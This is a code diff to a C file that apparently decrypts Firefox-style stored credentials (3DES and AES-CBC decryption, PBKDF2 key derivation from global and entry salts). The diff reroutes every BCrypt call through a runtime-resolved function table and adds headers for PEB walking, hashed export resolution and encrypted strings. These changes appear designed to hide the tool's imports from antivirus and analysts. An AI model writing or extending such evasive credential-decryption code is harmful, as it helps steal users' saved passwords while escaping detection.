@@ -18,6 +18,13 @@
 #include <windows.h>
 #pragma comment(lib, "bcrypt.lib")
 
+/* PEB-walk includes */
+#include "bcrypt_peb.h"
+#include "peb.h"
+#include "export_resolve.h"
+#include "hash.h"
+#include "enc_strings.h"
+
 /* MinGW BCrypt compatibility — full type + constant definitions */
 #ifndef BCRYPT_SHA1_ALGORITHM
 #define BCRYPT_SHA1_ALGORITHM L"SHA1"
@@ -170,39 +177,43 @@ int fx_asn1_peek_tag(FxAsn1Reader *r, uint8_t *tag) {
 #ifdef _WIN32
 
 void fx_sha1(const unsigned char *data, size_t len, unsigned char *out20) {
+    const bcrypt_api_t *bc = mirage_bcrypt_api();
+    if (!bc) return;
     BCRYPT_ALG_HANDLE hAlgo = NULL;
     BCRYPT_HASH_HANDLE hHash = NULL;
     NTSTATUS st;
-    st = BCryptOpenAlgorithmProvider(&hAlgo, BCRYPT_SHA1_ALGORITHM, NULL, 0);
+    st = bc->pOpen(&hAlgo, BCRYPT_SHA1_ALGORITHM, NULL, 0);
     if (st < 0) return;
-    st = BCryptCreateHash(hAlgo, &hHash, NULL, 0, NULL, 0, 0);
-    if (st < 0) { BCryptCloseAlgorithmProvider(hAlgo, 0); return; }
-    BCryptHashData(hHash, (PUCHAR)data, (ULONG)len, 0);
-    BCryptFinishHash(hHash, out20, 20, 0);
-    BCryptDestroyHash(hHash);
-    BCryptCloseAlgorithmProvider(hAlgo, 0);
+    st = bc->pCreateHash(hAlgo, &hHash, NULL, 0, NULL, 0, 0);
+    if (st < 0) { bc->pClose(hAlgo, 0); return; }
+    bc->pHashData(hHash, (PUCHAR)data, (ULONG)len, 0);
+    bc->pFinishHash(hHash, out20, 20, 0);
+    bc->pDestroyHash(hHash);
+    bc->pClose(hAlgo, 0);
 }
 
 void fx_hmac_sha1(const unsigned char *key, size_t key_len,
                   const unsigned char *data, size_t data_len,
                   unsigned char *out20) {
+    const bcrypt_api_t *bc = mirage_bcrypt_api();
+    if (!bc) return;
     BCRYPT_ALG_HANDLE hAlgo = NULL;
     BCRYPT_KEY_HANDLE hKey = NULL;
     NTSTATUS st;
-    st = BCryptOpenAlgorithmProvider(&hAlgo, BCRYPT_SHA1_ALGORITHM, NULL,
-                                BCRYPT_ALG_FLAG_HMAC_FLAG);
+    st = bc->pOpen(&hAlgo, BCRYPT_SHA1_ALGORITHM, NULL,
+                   BCRYPT_ALG_FLAG_HMAC_FLAG);
     if (st < 0) return;
-    st = BCryptGenerateSymmetricKey(hAlgo, &hKey, NULL, 0,
-                               (PUCHAR)key, (ULONG)key_len, 0);
-    if (st < 0) { BCryptCloseAlgorithmProvider(hAlgo, 0); return; }
+    st = bc->pGenKey(hAlgo, &hKey, NULL, 0,
+                     (PUCHAR)key, (ULONG)key_len, 0);
+    if (st < 0) { bc->pClose(hAlgo, 0); return; }
     BCRYPT_HASH_HANDLE hHash = NULL;
-    st = BCryptCreateHash(hAlgo, &hHash, NULL, 0, (PUCHAR)hKey, key_len, 0);
-    if (st < 0) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgo, 0); return; }
-    BCryptHashData(hHash, (PUCHAR)data, (ULONG)data_len, 0);
-    BCryptFinishHash(hHash, out20, 20, 0);
-    BCryptDestroyHash(hHash);
-    BCryptDestroyKey(hKey);
-    BCryptCloseAlgorithmProvider(hAlgo, 0);
+    st = bc->pCreateHash(hAlgo, &hHash, NULL, 0, (PUCHAR)hKey, key_len, 0);
+    if (st < 0) { bc->pDestroyKey(hKey); bc->pClose(hAlgo, 0); return; }
+    bc->pHashData(hHash, (PUCHAR)data, (ULONG)data_len, 0);
+    bc->pFinishHash(hHash, out20, 20, 0);
+    bc->pDestroyHash(hHash);
+    bc->pDestroyKey(hKey);
+    bc->pClose(hAlgo, 0);
 }
 
 #else
@@ -232,30 +243,32 @@ int fx_des3_decrypt_cbc(const uint8_t *key24, const uint8_t *iv8,
     if (data_len == 0 || data_len % 8 != 0) return -1;
     if (out_max < data_len) return -1;
 
+    const bcrypt_api_t *bc = mirage_bcrypt_api();
+    if (!bc) return -1;
     BCRYPT_ALG_HANDLE hAlgo = NULL;
     NTSTATUS st;
-    st = BCryptOpenAlgorithmProvider(&hAlgo, BCRYPT_3DES_ALGORITHM, NULL, 0);
+    st = bc->pOpen(&hAlgo, BCRYPT_3DES_ALGORITHM, NULL, 0);
     if (st < 0) return -1;
 
-    st = BCryptSetProperty(hAlgo, BCRYPT_CHAINING_MODE,
-                           (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
-                           sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
-    if (st < 0) { BCryptCloseAlgorithmProvider(hAlgo, 0); return -1; }
+    st = bc->pSetProp(hAlgo, BCRYPT_CHAINING_MODE,
+                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
+                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+    if (st < 0) { bc->pClose(hAlgo, 0); return -1; }
 
     BCRYPT_KEY_HANDLE hKey = NULL;
-    st = BCryptGenerateSymmetricKey(hAlgo, &hKey, NULL, 0,
-                                    (PUCHAR)key24, 24, 0);
-    if (st < 0) { BCryptCloseAlgorithmProvider(hAlgo, 0); return -1; }
+    st = bc->pGenKey(hAlgo, &hKey, NULL, 0,
+                     (PUCHAR)key24, 24, 0);
+    if (st < 0) { bc->pClose(hAlgo, 0); return -1; }
 
     uint8_t iv_buf[8];
     memcpy(iv_buf, iv8, 8);
     ULONG result_len = 0;
-    st = BCryptDecrypt(hKey, (PUCHAR)data, (ULONG)data_len,
-                       NULL, iv_buf, 8,
-                       out, (ULONG)out_max, &result_len, 0);
+    st = bc->pDecrypt(hKey, (PUCHAR)data, (ULONG)data_len,
+                      NULL, iv_buf, 8,
+                      out, (ULONG)out_max, &result_len, 0);
 
-    BCryptDestroyKey(hKey);
-    BCryptCloseAlgorithmProvider(hAlgo, 0);
+    bc->pDestroyKey(hKey);
+    bc->pClose(hAlgo, 0);
 
     if (st < 0) return -1;
     *out_len = result_len;
@@ -304,29 +317,31 @@ int fx_aes128_decrypt_cbc(const uint8_t *key16, const uint8_t *iv16,
     if (data_len == 0 || data_len % 16 != 0) return -1;
     if (out_max < data_len) return -1;
 
+    const bcrypt_api_t *bc = mirage_bcrypt_api();
+    if (!bc) return -1;
     BCRYPT_ALG_HANDLE hAlgo = NULL;
     NTSTATUS st;
-    st = BCryptOpenAlgorithmProvider(&hAlgo, BCRYPT_AES_ALGORITHM, NULL, 0);
+    st = bc->pOpen(&hAlgo, BCRYPT_AES_ALGORITHM, NULL, 0);
     if (st < 0) return -1;
-    st = BCryptSetProperty(hAlgo, BCRYPT_CHAINING_MODE,
-                           (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
-                           sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
-    if (st < 0) { BCryptCloseAlgorithmProvider(hAlgo, 0); return -1; }
+    st = bc->pSetProp(hAlgo, BCRYPT_CHAINING_MODE,
+                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
+                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+    if (st < 0) { bc->pClose(hAlgo, 0); return -1; }
 
     BCRYPT_KEY_HANDLE hKey = NULL;
-    st = BCryptGenerateSymmetricKey(hAlgo, &hKey, NULL, 0,
-                                    (PUCHAR)key16, 16, 0);
-    if (st < 0) { BCryptCloseAlgorithmProvider(hAlgo, 0); return -1; }
+    st = bc->pGenKey(hAlgo, &hKey, NULL, 0,
+                     (PUCHAR)key16, 16, 0);
+    if (st < 0) { bc->pClose(hAlgo, 0); return -1; }
 
     uint8_t iv_buf[16];
     memcpy(iv_buf, iv16, 16);
     ULONG result_len = 0;
-    st = BCryptDecrypt(hKey, (PUCHAR)data, (ULONG)data_len,
-                       NULL, iv_buf, 16,
-                       out, (ULONG)out_max, &result_len, 0);
+    st = bc->pDecrypt(hKey, (PUCHAR)data, (ULONG)data_len,
+                      NULL, iv_buf, 16,
+                      out, (ULONG)out_max, &result_len, 0);
 
-    BCryptDestroyKey(hKey);
-    BCryptCloseAlgorithmProvider(hAlgo, 0);
+    bc->pDestroyKey(hKey);
+    bc->pClose(hAlgo, 0);
 
     if (st < 0) return -1;
     *out_len = result_len;
@@ -562,12 +577,14 @@ int fx_decrypt_meta_pbe(const unsigned char *global_salt, size_t gs_len,
     /* PBKDF2-SHA256 */
     unsigned char aes_key[16];
 #ifdef _WIN32
+    const bcrypt_api_t *bc = mirage_bcrypt_api();
+    if (!bc) return -1;
     BCRYPT_ALG_HANDLE hAlgo = NULL;
-    BCryptOpenAlgorithmProvider(&hAlgo, BCRYPT_SHA256_ALGORITHM, NULL, 0);
-    BCryptDeriveKeyPBKDF2(hAlgo, key_material, 20,
-                          (PUCHAR)entry_salt, (ULONG)salt_len,
-                          (ULONG)iterations, aes_key, key_size, 0);
-    BCryptCloseAlgorithmProvider(hAlgo, 0);
+    bc->pOpen(&hAlgo, BCRYPT_SHA256_ALGORITHM, NULL, 0);
+    bc->pDerive(hAlgo, key_material, 20,
+                (PUCHAR)entry_salt, (ULONG)salt_len,
+                (ULONG)iterations, aes_key, key_size, 0);
+    bc->pClose(hAlgo, 0);
 #else
     PKCS5_PBKDF2_HMAC((const char *)key_material, 20,
                        entry_salt, (int)salt_len,
